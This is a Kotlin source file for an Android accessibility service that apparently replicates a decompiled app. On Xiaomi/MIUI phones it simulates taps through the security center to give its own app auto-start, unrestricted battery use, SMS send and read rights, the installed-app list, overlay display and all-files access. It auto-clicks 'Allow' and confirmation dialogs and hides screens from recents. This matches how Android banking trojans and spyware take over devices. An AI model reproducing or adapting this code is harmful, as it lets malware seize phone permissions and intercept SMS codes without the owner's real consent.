package com.storm.safe.rock.service.modules.yw5xud

import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * MiuiSteps — Xiaomi/MIUI-specific keepalive permission automation.
 * Matches vendor C0367a4 (a4, MiuiSteps). Key flows:
 *
 * 1. Auto-start management (自启动管理)
 *    - Navigate to: com.miui.securitycenter/.AutoStartManagementActivity
 *    - Find app in list, enable auto-start switch
 * 2. Battery saver (省电策略)
 *    - Navigate to app's battery settings
 *    - Set to "无限制" (No restrictions) via RadioButton
 * 3. Background popup (后台弹窗)
 *    - Navigate to permissions settings
 *    - Enable "显示弹窗" (Show popup) switch
 * 4. Lock screen display (锁屏显示)
 *    - Enable notification display on lock screen
 */
open class MiuiSteps(
    private val service: MyAccessibilityService?,
    private val context: Context
) {
    companion object {
        private const val TAG = "MiuiSteps"

        // Security center component names
        val AUTOSTART_COMPONENTS = listOf(
            ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"),
            ComponentName("com.miui.securitycenter", "com.miui.securitycenter.autostart.AutoStartManagementActivity")
        )

        val BATTERY_COMPONENTS = listOf(
            ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"),
            ComponentName("com.miui.securitycenter", "com.miui.powercenter.PowerSettings")
        )

        /** Keywords for finding auto-start toggle. Vendor 自启动 keywords. */
        val AUTOSTART_KEYWORDS = listOf("自启动", "自动启动", "Auto-start", "Autostart", "Auto start")

        /** Keywords for battery no-restriction. Vendor f55104c3 + f55105c4. */
        val BATTERY_NO_RESTRICT_KEYWORDS = listOf("无限制", "No restrictions", "Unrestricted", "不限制")
        val BATTERY_RADIO_KEYWORDS = listOf(
            "无限制", "后台运行超过10分钟后关闭", "禁止后台运行", "智能限制",
            "10分钟后关闭", "不采取任何限制措施",
            "無限制", "後台運行超過10分鐘後關閉", "禁止後台運行"
        )

        /** Keywords for battery detail entry (from ApplicationsDetailsActivity page). */
        val BATTERY_DETAIL_KEYWORDS = listOf("电量使用详情", "电池使用详情", "Battery usage details", "電量使用詳情")

        /** Keywords for power strategy entry on app detail page. Real MIUI 15 uses "省电策略" as the entry text. */
        val POWER_STRATEGY_ENTRY_KEYWORDS = listOf("省电策略", "電池策略", "Battery strategy", "Power saving strategy")

        /** Keywords for background popup. */
        val BG_POPUP_KEYWORDS = listOf("后台弹出界面", "后台弹窗", "Background pop-up", "Display pop-up")

        /** Permission management entry keywords. */
        val PERM_MGMT_KEYWORDS = listOf("权限管理", "權限管理", "Permission management")

        /** 6 permissions to enable in permission management page. Vendor MiuiSteps pattern. */
        val PERM_ITEMS = listOf(
            "发送短信", "读取短信", "读取已安装应用列表",
            "后台弹出界面", "通知类短信", "显示悬浮窗"
        )

        /** "Always allow" keywords for permission detail page. */
        val ALWAYS_ALLOW_KEYWORDS = listOf("始终允许", "始終允許", "Always allow", "允许", "允許", "Allow")

        /** Confirm dialog keywords. Vendor f55093b2. */
        val CONFIRM_KEYWORDS = listOf(
            "确定", "允许", "始终允许", "允许使用照片和视频", "所有文件",
            "允许管理所有文件", "允许访问全部", "使用期间允许", "仅使用期间允许",
            "使用应用时允许", "使用时允许", "仅在使用中允许", "仅在前台使用应用时允许",
            "仅在使用该应用时允许", "允许本次使用", "本次使用时允许", "允许通知",
            "確定", "允許", "始終允許", "Allow", "ALLOW", "Always allow",
            "While using the app"
        )

        /** Switch class names for matching. Vendor c7 list. */
        val SWITCH_CLASS_NAMES = listOf(
            "CheckBox", "Switch", "ToggleButton", "CompoundButton",
            "SwitchCompat", "HwSwitch", "MiuiSwitch", "slide"
        )

        /** Default page-stable wait: 2 consecutive polls with same node count. JADX: m212294f9 defaults. */
        private const val STABLE_REQUIRED_COUNT = 2
        private const val STABLE_POLL_INTERVAL_MS = 100L
        private const val STABLE_TIMEOUT_MS = 2000L

        /** Max scroll attempts for finding text. Vendor clickTextWithScroll default. */
        private const val MAX_SCROLL_ATTEMPTS = 5

        /** Permission allow keywords for Phase 0 self-polling. Vendor f55110a4. */
        val PERMISSION_ALLOW_KEYWORDS = listOf(
            "始终允许", "允许访问全部", "允许管理所有文件", "所有文件",
            "仅在使用中允许", "仅在使用此应用时允许", "在使用该应用时允许",
            "允许", "同意", "确定", "好",
            "Allow", "ALLOW", "Always allow", "While using the app"
        )

        /** Permission management keywords for 6-permission flow. Vendor m212256b5. */
        val PERM_MGMT_ENTRY_KEYWORDS = listOf("权限管理", "權限管理", "Permissions", "Permission manager")

        /** JADX step 3: 「其他权限」入口关键词。Vendor m212256b5 line 3088. */
        val OTHER_PERM_KEYWORDS = listOf("其他权限", "应用权限", "单项权限", "权限", "Other permissions", "App permissions", "Permissions")

        /** Page validation keywords — at least one must be present on ApplicationsDetailsActivity. */
        val APP_DETAIL_VALIDATION_KEYWORDS = listOf(
            "权限管理", "通知管理", "存储占用", "流量使用情况", "自启动", "电量使用详情",
            "Permissions", "Notifications", "Storage", "Data usage", "Auto-start", "Battery usage"
        )

        /** 6 permissions to set in permission management page. Vendor mapM213614f9. */
        val PERM_MGMT_ITEMS: List<Pair<String, List<String>>> = listOf(
            "发送短信" to listOf("发送短信", "發送短信", "Send SMS"),
            "读取短信" to listOf("读取短信与彩信", "读取短信", "讀取短信與彩信", "Read SMS"),
            "读取应用列表" to listOf("读取应用列表", "获取应用列表", "讀取應用列表", "Read app list"),
            "后台弹出界面" to listOf("后台弹出界面", "後台彈出界面", "Background pop-up"),
            "通知类短信" to listOf("通知类短信", "通知類短信", "Notification SMS"),
            "显示悬浮窗" to listOf("显示悬浮窗", "悬浮窗", "顯示懸浮窗", "Display over other apps")
        )

        /** Keywords to click after entering permission detail page. */
        val PERM_ALLOW_KEYWORDS = listOf(
            "始终允许", "Allow always", "允许", "Allow",
            "仅在使用时允许", "While using the app"
        )

        /** Phase 0 polling: 100 iterations x 50ms = 5s per round. */
        private const val PERM_POLL_ITERATIONS = 100
        private const val PERM_POLL_INTERVAL_MS = 50L

        // ================= Vendor ALL_FILES constants (C0367a4.m212254b3) =================
        /** vendor C0367a4 ALL_FILES 文本关键词. */
        val ALL_FILES_KEYWORDS: List<String> = listOf(
            "授予管理",
            "管理所有文件",
            "授予管理所有文件的权限",
            "允许管理所有文件",
            "允许访问所有文件"
        )
        /** vendor C0367a4:1915 坐标兜底 X 比例. */
        const val ALL_FILES_COORD_X_RATIO: Float = 0.875f
        /** vendor C0367a4:1916 坐标兜底 Y 比例. */
        const val ALL_FILES_COORD_Y_RATIO: Float = 0.225f
        /** vendor C0367a4 level3 坐标点击持续时间 (ms). */
        const val ALL_FILES_COORD_DURATION_MS: Long = 100L
        /** vendor C0367a4:1960 验证轮数. */
        const val ALL_FILES_VERIFY_ROUNDS: Int = 3
        /** vendor C0367a4:1907 验证间隔. */
        const val ALL_FILES_VERIFY_DELAY_MS: Long = 150L
        /** vendor C0367a4 外层整体重试次数. */
        const val ALL_FILES_OUTER_RETRIES: Int = 3
        /**
         * 2026-04-16 ADAPT: 整体超时 3 秒 — 超时则跳过，不阻塞后续生物识别流程。
         * vendor 无此超时（retry=Integer.MAX_VALUE），replica 为 debug/开发期加上以解锁 E2E pipeline。
         */
        const val ALL_FILES_OVERALL_TIMEOUT_MS: Long = 3_000L
        /** vendor C0367a4:1841 主 Intent flags (NEW_TASK|EXCLUDE_FROM_RECENTS). */
        const val ALL_FILES_MAIN_FLAGS: Int = 0x10800000
        /** vendor C0367a4:1813 预热 Intent flags (NEW_TASK|NO_HISTORY|EXCLUDE_FROM_RECENTS|NO_ANIMATION). */
        const val ALL_FILES_PREDWARM_FLAGS: Int = 0x50810000
    }

    /**
     * Main execution entry for MIUI-specific steps.
     * Vendor m212253b2: 5 phases — basic permissions, battery, auto-start,
     * notification, background popup/overlay. Each phase opens settings,
     * waits for page stable, then actively searches and clicks UI elements.
     */
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("MiuiSteps: 开始小米/MIUI权限配置")
        UiDebugger.logStep(TAG, "MiuiSteps.execute() 开始", "brand=xiaomi")

        // Phase 0: Basic permissions — self-polling click loop (vendor f55110a4 keywords)
        // Launch umrkmgrri for batch runtime permission request, then poll 100×50ms
        // searching for allow keywords and clicking them directly. No handler dependency.
        try {
            logs.add("MiuiSteps: 启动基础权限请求 (umrkmgrri)")
            UiDebugger.dumpPage(service, "miui_phase0_before", "基础权限请求前")
            com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.start(context)
            interruptibleDelay(800L)

            var clickCount = 0
            for (i in 0 until PERM_POLL_ITERATIONS) {
                if (!com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.isRequestingPermissions) {
                    Log.i(TAG, "[Phase0] umrkmgrri finished after ${i * PERM_POLL_INTERVAL_MS}ms, clicks=$clickCount")
                    break
                }
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                if (root != null) {
                    if (pollClickPermissionAllow(root)) clickCount++
                }
                delay(PERM_POLL_INTERVAL_MS)
            }
            UiDebugger.dumpPage(service, "miui_phase0_after", "基础权限完成, clicks=$clickCount")
            successes.add("基础权限请求完成 (点击${clickCount}次)")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "[Phase0] 异常: ${e.message}")
        }

        // Phase 1: Auto-start management — search for "自启动" on app detail page
        executeAutoStart(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(1500L)
        UiDebugger.dumpPage(service, "miui_phase1_app_detail", "应用详情页已打开")
        // On ApplicationsDetailsActivity, search for "自启动" text and click its switch
        val autoStartKeywords = arrayOf("自启动", "自啟動")
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
        if (root != null) {
            UiDebugger.dumpPage(service, "miui_phase1_find_switch", "搜索自启动开关")
            var found = false
            for (keyword in autoStartKeywords) {
                val result = findTextAndClickSwitch(root, keyword)
                if (result) {
                    handleConfirmPopupDialog()
                    successes.add("小米自启动开关已点击")
                    found = true
                    break
                }
            }
            if (!found) {
                Log.w(TAG, "[自启动] 未找到自启动开关")
            }
        }
        interruptibleDelay(1000L)

        // Phase 2: Power strategy — via ApplicationsDetailsActivity → 电量使用详情 → 无限制
        executePowerStrategy(successes, failures, logs)
        interruptibleDelay(1000L)

        // Phase 3: Permission management — 6 permissions in one flow (vendor step 18.1)
        executePermissionManagement(successes, failures, logs)
        interruptibleDelay(1000L)

        // Phase 4 (2026-04-16 Plan wire-up): ALL_FILES (MANAGE_EXTERNAL_STORAGE) 授权
        // vendor C0367a4.m212254b3 包含该步骤；Plan 2026-04-16-vendor-real-device-alignment
        // 新建了 executeAllFilesAccess 但未接入主链路 — 在此接入。
        try {
            executeAllFilesAccess(successes, failures, logs)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "[Phase4] executeAllFilesAccess 异常: ${e.message}")
            failures.add("all_files_access: ${e.message}")
        }

        // Vendor: NO returnToHome after last phase — settings page stays in foreground.
        // This provides VISIBLE_WINDOW for subsequent resumeWriteSettingsPermissionRequest.
        logs.add("MiuiSteps: 小米/MIUI权限配置完成")
    }

    /**
     * Navigate to auto-start management and enable for our app.
     * Vendor: executeAutoStart flow
     */
    open fun executeAutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase1: executeAutoStart 开始")
            // Vendor: open ApplicationsDetailsActivity with package_name extra
            // This shows OUR app's detail page (with auto-start switch), not the list of all apps
            val securityPkg = "com.miui.securitycenter"
            try {
                val intent = Intent().apply {
                    component = ComponentName(securityPkg, "com.miui.appmanager.ApplicationsDetailsActivity")
                    putExtra("package_name", context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                             Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(intent)
                logs.add("已启动安全中心应用详情页（带自启动）")
                successes.add("小米应用详情页已打开")
                return
            } catch (e: Exception) {
                logs.add("安全中心应用详情打开失败: ${e.message}，尝试标准方式")
            }

            // Fallback: standard app details settings
            val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已打开标准应用详情页（无自启动）")
        } catch (e: Exception) {
            failures.add("小米自启动配置异常: ${e.message}")
        }
    }

    /**
     * Power strategy: open ApplicationsDetailsActivity → click "省电策略" → 电量详情 page → click "无限制".
     *
     * Vendor C0367a4.m212261c0 step 13.5 (POWER_STRATEGY):
     *   1. Open ApplicationsDetailsActivity via m212275d9() (securitycenter or standard Settings fallback)
     *   2. On app detail page, find "省电策略" text and click it → navigates to "电量详情" page
     *   3. On 电量详情 page, scroll down to "省电策略" section, find "无限制" (CheckedTextView) and click
     *   4. Verify checked state
     *
     * Vendor C0364a1 executeXiaomiBackgroundManagement uses HiddenAppsConfigActivity as a
     * direct shortcut to the same page, with dh0.f55766b6 keyword list for "无限制".
     *
     * Real MIUI 15 (小米13) UI dump confirms:
     *   - App detail page entry text: "省电策略" (NOT "电量使用详情")
     *   - Target page title: "电量详情" (com.miui.securitycenter)
     *   - Target option: "无限制" (CheckedTextView, android:id/title)
     */
    open suspend fun executePowerStrategy(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase2: executePowerStrategy 开始")

            // Step 1: Open ApplicationsDetailsActivity (vendor m212275d9)
            val launched = openApplicationsDetailsActivity()

            if (!launched) {
                // Fallback: try HiddenAppsConfigActivity (vendor C0364a1 approach)
                Log.i(TAG, "[省电策略] ApplicationsDetailsActivity 打开失败，尝试 HiddenAppsConfigActivity")
                val fallbackLaunched = launchComponentActivity(BATTERY_COMPONENTS)
                if (fallbackLaunched) {
                    interruptibleDelay(2000L)
                    waitForPageStable()
                    clickUnrestrictedOption(successes, failures, logs)
                } else {
                    logs.add("[省电策略] 所有启动方式均失败，跳过省电策略")
                }
                return
            }

            logs.add("[省电策略] 已打开应用详情页")
            interruptibleDelay(1500L)
            waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase2_app_detail", "省电策略-应用详情页")

            // Step 2: Click "省电策略" entry on app detail page to enter 电量详情 page
            // MIUI 15 uses "省电策略" as the entry text, NOT "电量使用详情" (which is a different item)
            UiDebugger.dumpPage(service, "miui_phase2_find_power_strategy", "搜索省电策略入口")
            var enteredPowerPage = false

            // Primary: try "省电策略" keywords first (matches real MIUI 15 UI)
            for (keyword in POWER_STRATEGY_ENTRY_KEYWORDS) {
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: continue
                val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        if (clickNodeWithFallback(node)) {
                            Log.i(TAG, "[省电策略] 点击省电策略入口: $keyword")
                            enteredPowerPage = true
                            break
                        }
                    }
                }
                if (enteredPowerPage) break
            }

            // Secondary fallback: try "电量使用详情" keywords (older MIUI versions)
            if (!enteredPowerPage) {
                for (keyword in BATTERY_DETAIL_KEYWORDS) {
                    val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: continue
                    val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                    if (nodes.isNullOrEmpty()) continue
                    for (node in nodes) {
                        if (node.isVisibleToUser) {
                            if (clickNodeWithFallback(node)) {
                                Log.i(TAG, "[省电策略] 点击电量详情入口(fallback): $keyword")
                                enteredPowerPage = true
                                break
                            }
                        }
                    }
                    if (enteredPowerPage) break
                }
            }

            if (!enteredPowerPage) {
                // Last resort: scroll down and try again
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                if (root != null) {
                    scrollDown(root)
                    interruptibleDelay(500L)
                    for (keyword in POWER_STRATEGY_ENTRY_KEYWORDS + BATTERY_DETAIL_KEYWORDS) {
                        val newRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: continue
                        val nodes = try { newRoot.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                        if (nodes.isNullOrEmpty()) continue
                        for (node in nodes) {
                            if (node.isVisibleToUser) {
                                if (clickNodeWithFallback(node)) {
                                    Log.i(TAG, "[省电策略] 滚动后找到入口: $keyword")
                                    enteredPowerPage = true
                                    break
                                }
                            }
                        }
                        if (enteredPowerPage) break
                    }
                }
            }

            if (!enteredPowerPage) {
                logs.add("[省电策略] 未找到省电策略入口，跳过")
                return
            }

            // Step 3: Wait for 电量详情 page to load
            interruptibleDelay(1500L)
            waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase2_battery_detail", "电量详情页")

            // Step 4: On 电量详情 page, click "无限制"
            // The radio buttons may be below the fold, scroll down first
            clickUnrestrictedOption(successes, failures, logs)

            // Step 5: 点击页面左上角的 "返回" 按钮（id=com.miui.securitycenter:id/up）
            // 而不是用 performGlobalAction(BACK)：系统 BACK 键在 MIUI PowerDetailActivity 上
            // 会关掉整个 securitycenter (Task 870)；页面内的 UI 返回按钮是 ActivityTask 的正常
            // 导航，会回到 Task 862 的 ApplicationsDetailsActivity。
            interruptibleDelay(500L)
            try {
                val root = service?.rootInActiveWindow
                val upButton = root?.findAccessibilityNodeInfosByViewId(
                    "com.miui.securitycenter:id/up"
                )?.firstOrNull()
                if (upButton != null && upButton.isClickable) {
                    upButton.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                    Log.i(TAG, "[省电策略] 点击页面返回按钮")
                    interruptibleDelay(800L)
                    waitForPageStable()
                } else {
                    Log.w(TAG, "[省电策略] 未找到页面返回按钮 (id=up)，跳过返回")
                }
            } catch (e: Exception) {
                Log.w(TAG, "[省电策略] 点击返回按钮异常: ${e.message}")
            }

        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "[省电策略] 异常: ${e.message}", e)
            failures.add("小米省电策略异常: ${e.message}")
        }
    }

    /**
     * Open ApplicationsDetailsActivity. Vendor m212275d9:
     * 1. Try com.miui.securitycenter → com.miui.appmanager.ApplicationsDetailsActivity
     * 2. Fallback to android.settings.APPLICATION_DETAILS_SETTINGS
     */
    private fun openApplicationsDetailsActivity(): Boolean {
        // Primary: MIUI security center (has auto-start toggle)
        // 去掉 NO_HISTORY: Phase2 从应用详情页跳转 PowerDetailActivity 时，
        // NO_HISTORY 会自动 finish ApplicationsDetailsActivity，导致 Phase3 找不到它。
        try {
            val intent = Intent().apply {
                component = ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.appmanager.ApplicationsDetailsActivity"
                )
                putExtra("package_name", context.packageName)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            (service ?: context).startActivity(intent)
            Log.i(TAG, "[省电策略] 安全中心应用详情已打开")
            return true
        } catch (e: Exception) {
            Log.w(TAG, "[省电策略] 安全中心打开失败: ${e.message}，尝试标准方式")
        }
        // Fallback: standard Settings app info
        try {
            val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            (service ?: context).startActivity(intent)
            Log.i(TAG, "[省电策略] 标准应用详情已打开")
            return true
        } catch (e: Exception) {
            Log.e(TAG, "[省电策略] 标准方式也失败: ${e.message}")
        }
        return false
    }

    /**
     * Click the "无限制" option on the 电量详情/省电策略 page.
     * Vendor approach (C0364a1 executeXiaomiBackgroundManagement + C0367a4 m212261c0):
     *   - Uses dh0.f55766b6 comprehensive keyword list
     *   - Checks if already selected (parent.isChecked/isSelected, up to 3 levels)
     *   - If not selected, uses coordinate-based click (getBounds → centerX/centerY)
     *   - Waits 500ms after click, then presses back
     */
    private suspend fun clickUnrestrictedOption(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        // First try without scrolling
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
        if (root != null && tryClickUnrestricted(root)) {
            successes.add("小米省电策略已设置为无限制")
            Log.i(TAG, "[省电策略] 已点击无限制")
            return
        }

        // Scroll down and retry (radio buttons may be below fold in 电量详情)
        for (attempt in 0 until MAX_SCROLL_ATTEMPTS) {
            val scrollRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: break
            if (!scrollDown(scrollRoot)) break
            interruptibleDelay(500L)

            val newRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: break
            if (tryClickUnrestricted(newRoot)) {
                successes.add("小米省电策略已设置为无限制")
                Log.i(TAG, "[省电策略] 滚动后已点击无限制")
                return
            }
        }

        logs.add("[省电策略] 未找到无限制选项")
    }

    /**
     * Try to find and click "无限制" on current page.
     * Vendor pattern from C0364a1 lines 3290-3336:
     *   - Search for keywords from dh0.f55766b6 ("无限制", "不受限制", "無限制", "No restrictions", ...)
     *   - For each found node, check if parent (up to 3 levels) is already checked/selected
     *   - If already checked → skip (already unrestricted)
     *   - If not checked → click via coordinate tap
     */
    private fun tryClickUnrestricted(root: AccessibilityNodeInfo): Boolean {
        for (keyword in BATTERY_NO_RESTRICT_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue

            for (node in nodes) {
                if (!node.isVisibleToUser) continue

                // Check if already selected (vendor: walk up 3 parent levels for isChecked/isSelected)
                var parent = node.parent
                var alreadySelected = false
                for (depth in 0 until 3) {
                    if (parent == null) break
                    if (parent.isChecked || parent.isSelected) {
                        Log.i(TAG, "[省电策略] '$keyword' 已经是选中状态")
                        alreadySelected = true
                        break
                    }
                    parent = parent.parent
                }

                // Also check the node itself (CheckedTextView has isChecked directly)
                if (!alreadySelected && node.isChecked) {
                    Log.i(TAG, "[省电策略] '$keyword' 节点自身已选中")
                    alreadySelected = true
                }

                if (alreadySelected) {
                    return true  // Already unrestricted, count as success
                }

                // Click via coordinate tap (vendor: getBounds → centerX, centerY → gesture tap)
                if (clickNodeWithFallback(node)) {
                    Log.i(TAG, "[省电策略] 已点击 '$keyword'")
                    return true
                }
            }
        }
        return false
    }

    /**
     * Navigate to battery saver settings and set to unrestricted.
     * Vendor: executeBatterySaver flow (legacy fallback)
     */
    fun executeBatterySaver(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(BATTERY_COMPONENTS)
            if (launched) {
                logs.add("已启动省电策略页面")
                successes.add("小米省电策略已打开")
            } else {
                // Fallback: open app info battery settings
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                context.startActivity(intent)
                logs.add("已打开应用信息页面(回退)")
            }
        } catch (e: Exception) {
            failures.add("小米省电策略配置异常: ${e.message}")
        }
    }

    /**
     * Enable background popup permission.
     * Vendor: executeBackgroundPopup flow
     */
    open fun executeBackgroundPopup(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            // Navigate to app permissions
            val intent = Intent("miui.intent.action.APP_PERM_EDITOR").apply {
                putExtra("extra_pkgname", context.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已启动MIUI权限编辑器")
            successes.add("小米后台弹窗权限已打开")
        } catch (e: Exception) {
            // Fallback
            logs.add("MIUI权限编辑器启动失败, 跳过后台弹窗: ${e.message}")
        }
    }

    /**
     * Permission management — 6 permissions in one flow.
     * JADX: C0367a4.m212256b5 (executeBackgroundPopupFlow)
     */
    open suspend fun executePermissionManagement(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase3: executePermissionManagement 开始")
            // Phase2 末尾已点击页面"返回"按钮回到 ApplicationsDetailsActivity，
            // 这里 startActivity 只需要把它带到前台
            val securityPkg = "com.miui.securitycenter"
            val intent = Intent().apply {
                component = ComponentName(securityPkg, "com.miui.appmanager.ApplicationsDetailsActivity")
                putExtra("package_name", context.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or
                         Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            try {
                (service ?: context).startActivity(intent)
                logs.add("已打开安全中心应用详情页")
            } catch (e: Exception) {
                logs.add("安全中心应用详情打开失败: ${e.message}")
                return
            }

            interruptibleDelay(1500L)
            waitForPageStable()

            // 校验当前是否在应用详情页；若不是（Phase2 返回按钮导航失败），重新 startActivity
            val appInfoSignatures = listOf("应用信息", "存储占用", "权限相关", "应用联网")
            suspend fun isOnAppDetailPage(): Boolean {
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
                return appInfoSignatures.any { marker ->
                    try {
                        !root.findAccessibilityNodeInfosByText(marker).isNullOrEmpty()
                    } catch (_: Exception) { false }
                }
            }

            var appInfoPageReady = isOnAppDetailPage()
            if (!appInfoPageReady) {
                // 快速等待 2s 看是否自动加载
                for (retry in 0 until 4) {
                    interruptibleDelay(500L)
                    if (isOnAppDetailPage()) { appInfoPageReady = true; break }
                }
            }
            if (!appInfoPageReady) {
                // 不在应用详情页 — 再次 startActivity 强制跳转
                Log.w(TAG, "[权限管理] 当前不在应用详情页，重新 startActivity")
                try {
                    (service ?: context).startActivity(intent)
                    interruptibleDelay(1500L)
                    waitForPageStable()
                    for (retry in 0 until 6) {
                        if (isOnAppDetailPage()) { appInfoPageReady = true; break }
                        interruptibleDelay(500L)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "[权限管理] 重新跳转失败: ${e.message}")
                }
            }
            if (appInfoPageReady) {
                Log.i(TAG, "[权限管理] ApplicationsDetailsActivity 已加载")
            } else {
                Log.w(TAG, "[权限管理] 应用详情页加载失败，中止 Phase3")
                logs.add("未找到权限管理入口（无法加载应用详情页）")
                return
            }
            UiDebugger.dumpPage(service, "miui_phase3_security_center", "安全中心应用详情页")

            var enteredPermMgmt = false
            for (keyword in PERM_MGMT_ENTRY_KEYWORDS) {
                if (clickTextNode(keyword)) { enteredPermMgmt = true; logs.add("已进入权限管理页面"); break }
            }
            if (!enteredPermMgmt) {
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                if (root != null) {
                    for (i in 0 until 3) {
                        scrollDown(root); interruptibleDelay(500L)
                        for (keyword in PERM_MGMT_ENTRY_KEYWORDS) {
                            if (clickTextNode(keyword)) { enteredPermMgmt = true; break }
                        }
                        if (enteredPermMgmt) break
                    }
                }
            }
            if (!enteredPermMgmt) { logs.add("未找到权限管理入口"); return }

            interruptibleDelay(1500L)
            waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase3_perm_mgmt", "权限管理页面")

            // JADX step 3: 点击「其他权限」进入子页面（vendor m212256b5 line 3088-3139）
            var enteredOtherPerm = false
            for (keyword in OTHER_PERM_KEYWORDS) {
                if (clickTextNode(keyword)) { enteredOtherPerm = true; Log.i(TAG, "[权限管理] 已进入「$keyword」子页面"); break }
            }
            if (!enteredOtherPerm) {
                val root2 = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                if (root2 != null) {
                    for (i in 0 until 3) {
                        scrollDown(root2); interruptibleDelay(500L)
                        for (keyword in OTHER_PERM_KEYWORDS) {
                            if (clickTextNode(keyword)) { enteredOtherPerm = true; break }
                        }
                        if (enteredOtherPerm) break
                    }
                }
            }
            if (!enteredOtherPerm) {
                Log.w(TAG, "[权限管理] 未找到「其他权限」入口，直接在当前页面查找权限")
            } else {
                interruptibleDelay(1500L)
                waitForPageStable()
                UiDebugger.dumpPage(service, "miui_phase3_other_perms", "其他权限子页面")
            }

            var completedCount = 0
            for ((name, keywords) in PERM_MGMT_ITEMS) {
                UiDebugger.dumpPage(service, "miui_phase3_perm_${name}", "搜索权限: $name")
                // Verify we're still on the other permissions page before each item
                // If pressBack went too far (back to 系统服务), re-enter 其他权限
                if (!ensureOnOtherPermissionsPage()) {
                    Log.w(TAG, "[权限管理] 无法回到其他权限页面，中止")
                    break
                }

                val clicked = clickPermissionItemMulti(keywords, logs)
                if (clicked) {
                    interruptibleDelay(800L)
                    // 诊断：点击后 dump 当前页面，确认进入了权限详情页
                    UiDebugger.dumpPage(service, "miui_phase3_perm_${name}_after_click",
                        "点击${name}后的页面")
                    // 诊断：打印当前页面顶部 titles，帮助确认是权限详情页还是其他权限页
                    try {
                        val r = service?.rootInActiveWindow
